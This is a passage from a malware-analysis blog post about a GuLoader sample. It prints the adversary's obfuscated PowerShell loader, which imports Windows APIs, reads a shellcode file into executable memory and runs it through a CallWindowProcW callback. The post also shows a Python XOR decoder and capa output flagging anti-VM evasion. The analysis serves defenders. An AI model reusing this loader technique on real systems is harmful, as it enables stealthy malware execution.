data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="sh">@"
using System;
using System.Runtime.InteropServices;
public static class Ofayve1
{
[DllImport("ntdll.dll")]public static extern int NtAllocateVirtualMemory(int Ofayve6,ref Int32 Swat9,int Rasko8,ref Int32 Ofayve,int Metzerespe9,int Ofayve7);
[DllImport("kernel32.dll")]public static extern IntPtr CreateFileA(string BUTTERMA,uint Contra6,int undvrpieti,int Ofayve0,int Foldysy7,int Oboer8,int BLUFF);
[DllImport("kernel32.dll")]public static extern int ReadFile(int Rasko80,uint Rasko81,IntPtr Rasko82,ref Int32 Rasko83,int Rasko84);
[DllImport("user32.dll")]public static extern IntPtr CallWindowProcW(IntPtr Rasko85,int Rasko86,int Rasko87,int Rasko88,int Rasko89);
}
"@</span><span class="w">
</span></pre></table></code></div></div><p>From here in, the adversary references that class/type to call Windows API functions. The first three are pretty self-explanatory and I’ll put links to their documentation here:</p><ul><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory">NtAllocateVirtualMemory</a><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">CreateFileA</a><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile">ReadFile</a></ul><p>When combined together, these functions read the contents of <code class="language-plaintext highlighter-rouge">Champag6.dat</code> and mapped them into memory at <code class="language-plaintext highlighter-rouge">$Ofayve3</code>. These contents included the hex string seen earlier, and my working hypothesis is that the file is some form of shellcode.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$Ofayve3</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w">
</span><span class="nv">$Ofayve9</span><span class="o">=</span><span class="mi">1048576</span><span class="p">;</span><span class="w">
</span><span class="nv">$Ofayve8</span><span class="o">=</span><span class="p">[</span><span class="n">Ofayve1</span><span class="p">]::</span><span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="nt">-1</span><span class="p">,[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$Ofayve3</span><span class="p">,</span><span class="mi">0</span><span class="p">,[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$Ofayve9</span><span class="p">,</span><span class="mi">12288</span><span class="p">,</span><span class="mi">64</span><span class="p">)</span><span class="w">

</span><span class="nv">$Ofayve2</span><span class="o">=</span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">temp</span><span class="s2">"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"\Champag6.dat"</span><span class="w">
</span><span class="nv">$Ofayve4</span><span class="o">=</span><span class="p">[</span><span class="n">Ofayve1</span><span class="p">]::</span><span class="n">CreateFileA</span><span class="p">(</span><span class="nv">$Ofayve2</span><span class="p">,</span><span class="mi">2147483648</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span><span class="nv">$Ofayve5</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">Ofayve1</span><span class="p">]::</span><span class="n">ReadFile</span><span class="p">(</span><span class="nv">$Ofayve4</span><span class="p">,</span><span class="nv">$Ofayve3</span><span class="p">,</span><span class="mi">26042</span><span class="p">,[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$Ofayve5</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">Ofayve1</span><span class="p">]::</span><span class="n">CallWindowProcW</span><span class="p">(</span><span class="nv">$Ofayve3</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>The final part of the script calls <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callwindowprocw"><code class="language-plaintext highlighter-rouge">CallWindowProcW</code></a>, which was unusual for me to see. I decided to get a little wild and do a Google search for “CallWindowProc shellcode” and ended up running across an interesting article on <a href="https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/">using function callbacks to run shellcode</a>. Reading down the article, I could see some code that looks very similar to our sample:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">CallWindowProc</span><span class="p">((</span><span class="n">WNDPROC</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="p">(</span><span class="n">HWND</span><span class="p">)</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</pre></table></code></div></div><p>Sure enough, the GuLoader code above seems to match that callback article.</p><h2 id="but-is-it-guloader"><span class="me-2">But is it GuLoader?</span><a href="#but-is-it-guloader" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Honestly this is hard for me to tell. I largely trust the GuLoader tag in MalwareBazaar but it’s always good to have extra proof. When I open up the suspected shellcode in Ghidra there is some definite XOR activity going on.</p><p><a href="/assets/images/guloader-executing-shellcode-callbacks/xor.png" class="popup img-link shimmer"><img src="/assets/images/guloader-executing-shellcode-callbacks/xor.png" alt="XOR in Ghidra" loading="lazy"></a></p><p>And when I use this little chunk of Python code, I can reverse that XOR:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">str_xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span>
    <span class="k">return</span> <span class="n">data</span>

<span class="n">key</span>  <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x6a8a4f58</span><span class="sh">'</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">encoded_shellcode.bin</span><span class="sh">'</span><span class="p">,</span>  <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">())</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="nf">str_xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
<span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">decoded_shellcode.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
</pre></table></code></div></div><p>Credit to https://reverseengineering.stackexchange.com/questions/11033/how-to-decrypt-data-in-binary-file-by-xor-operator-using-a-given-key-at-specific</p><p>The resulting shellcode gets some hits from <code class="language-plaintext highlighter-rouge">capa</code> as containing anti-VM and sandbox evasion measures.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/guloader$</span><span class="w"> </span>capa <span class="nt">-f</span> sc32 dec_shellcode.bin 
<span class="go">+------------------------------------------------------+------------------------------------+
| md5                    | 565eb36ab19132a4b963cc840febd24c                                 |
| sha1                   | 78dd372f6ed9962d0a0e3841675ab374235d2f94                         |
| sha256                 | 82ec24bbf698d635f3e7bfbda89971518f010c8efde79fcd43a2805a0945850f |
| path                   | dec_shellcode.bin                                                |
+------------------------------------------------------+------------------------------------+

+------------------------------------------------------+------------------------------------+
| ATT&amp;CK Tactic          | ATT&amp;CK Technique                                                 |
+------------------------------------------------------+------------------------------------+
| DEFENSE EVASION        | Virtualization/Sandbox Evasion::System Checks T1497.001          |
+------------------------------------------------------+------------------------------------+
+------------------------------------------------------+------------------------------------+
| MBC Objective               | MBC Behavior                                                |
+------------------------------------------------------+------------------------------------+
| ANTI-BEHAVIORAL ANALYSIS    | Virtual Machine Detection::Instruction Testing [B0009.029]  |
+------------------------------------------------------+------------------------------------+

+------------------------------------------------------+------------------------------------+
| CAPABILITY                    | NAMESPACE                                                 |
+------------------------------------------------------+------------------------------------+
| execute anti-VM instructions  | anti-analysis/anti-vm/vm-detection                        |
+------------------------------------------------------+------------------------------------+
</span></pre></table></code></div></div><p>This is where I stopped my particular analysis. GuLoader is rather famous for anti-VM, anti-sandbox, anti-whatever, so I feel pretty satisfied with our progress so far. Given the shellcode capabilities and the face that GuLoader usually involves shellcode like this, I’m good with calling it GuLoader.</p><p>Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/malware/">malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/guloader/" class="post-tag no-text-decoration" >guloader</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >shellcode</a> <a href="/tags/callbacks/" class="post-tag no-text-decoration" >callbacks</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=GuLoader%20Executing%20Shellcode%20Using%20Callback%20Functions%20-%20Tony%20Lambert&url=https%3A%2F%2Fforensicitguy.github.io%2Fguloader-executing-shellcode-callbacks%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=GuLoader%20Executing%20Shellcode%20Using%20Callback%20Functions%20-%20Tony%20Lambert&u=https%3A%2F%2Fforensicitguy.github.io%2Fguloader-executing-shellcode-callbacks%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fforensicitguy.github.io%2Fguloader-executing-shellcode-callbacks%2F&text=GuLoader%20Executing%20Shellcode%20Using%20Callback%20Functions%20-%20Tony%20Lambert" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fforensicitguy.github.io%2Fguloader-executing-shellcode-callbacks%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <script defer type="module" src="https://cdn.jsdelivr.net/npm/@justinribeiro/share-to-mastodon/+esm"></script> <button class="btn text-start" data-bs-toggle="tooltip" data-bs-placement="top" title="Mastodon" aria-label="Mastodon"> <share-to-mastodon class="share-mastodon" message="GuLoader%20Executing%20Shellcode%20Using%20Callback%20Functions%20-%20Tony%20Lambert" url="https%3A%2F%2Fforensicitguy.github.io%2Fguloader-executing-shellcode-callbacks%2F"customInstanceList="[{&quot;label&quot;:&quot;mastodon.social&quot;,&quot;link&quot;:&quot;https://mastodon.social/&quot;},{&quot;label&quot;:&quot;mastodon.online&quot;,&quot;link&quot;:&quot;https://mastodon.online/&quot;},{&quot;label&quot;:&quot;fosstodon.org&quot;,&quot;link&quot;:&quot;https://fosstodon.org/&quot;},{&quot;label&quot;:&quot;infosec.exchange&quot;,&quot;link&quot;:&quot;https://infosec.exchange/&quot;}]" > <i class="fa-fw fa-brands fa-mastodon"></i> </share-to-mastodon> </button> <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fforensicitguy.github.io%2Fguloader-executing-shellcode-callbacks%2F&title=GuLoader%20Executing%20Shellcode%20Using%20Callback%20Functions%20-%20Tony%20Lambert" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit"> <i class="fa-fw fa-brands fa-square-reddit"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/decompiling-jphp-loader-binwalk-cfr/">Decompiling a JPHP Loader with binwalk and cfr</a><li class="text-truncate lh-lg"> <a href="/dissecting-java-pikabot-dropper/">Dissecting a Java Pikabot Dropper</a><li class="text-truncate lh-lg"> <a href="/timelining-malware-vhd-intelligence/">Timelining a Malicious VHD for More Intelligence</a><li class="text-truncate lh-lg"> <a href="/vhd-malware-an-excellent-choice/">Malware via VHD Files, an Excellent Choice</a><li class="text-truncate lh-lg"> <a href="/faster-malware-triage-yara/">Faster Malware Triage with YARA</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/msi/">msi</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag btn btn-outline-primary" href="/tags/jar/">jar</a> <a class="post-tag btn btn-outline-primary" href="/tags/java/">java</a> <a class="post-tag btn btn-outline-primary" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag btn btn-outline-primary" href="/tags/mshta/">mshta</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.net</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/powerpoint-macros-olevba/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1641513600" data-df="ll" > Jan 7, 2022 </time><h4 class="pt-0 my-2">Looking at PowerPoint Macros with Olevba</h4><div class="text-muted"><p>In this post I want to walk through analysis of a malicious PowerPoint file using olevba. This tool allows you to view macros within Office documents without opening them. If you want to follow alo...</p></div></div></a></article><article class="col"> <a href="/decoding-webshell-using-nodejs/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1641427200" data-df="ll" > Jan 6, 2022 </time><h4 class="pt-0 my-2">Decoding an Encoded Webshell Using NodeJS</h4><div class="text-muted"><p>In this post I want to walk through a process of using the NodeJS REPL (Read, Eval, Print Loop) to safely decode portions of malware during analysis. If you want to follow along at home, the sample...</p></div></div></a></article><article class="col"> <a href="/extracting-indicators-from-packed-mirai/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1641254400" data-df="ll" > Jan 4, 2022 </time><h4 class="pt-0 my-2">Extracting Indicators from a Packed Mirai Sample</h4><div class="text-muted"><p>Packing is really commonly used by adversary to stump analysis, so in this post I’m going to look at a sample that is really easy to unpack and get indicators from. In this case the sample is Mirai...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/hcrypt-injecting-bitrat-analysis/" class="btn btn-outline-primary" aria-label="Older" ><p>HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET</p></a> <a href="/strrat-attached-to-msi/" class="btn btn-outline-primary" aria-label="Newer" ><p>STRRAT Attached to a MSI File</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/msi/">msi</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag btn btn-outline-primary" href="/tags/jar/">jar</a> <a class="post-tag btn btn-outline-primary" href="/tags/java/">java</a> <a class="post-tag btn btn-outline-primary" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag btn btn-outline-primary" href="/tags/mshta/">mshta</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.net</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.29.0/dist/tocbot.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener('DOMContentLoaded', function (event) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
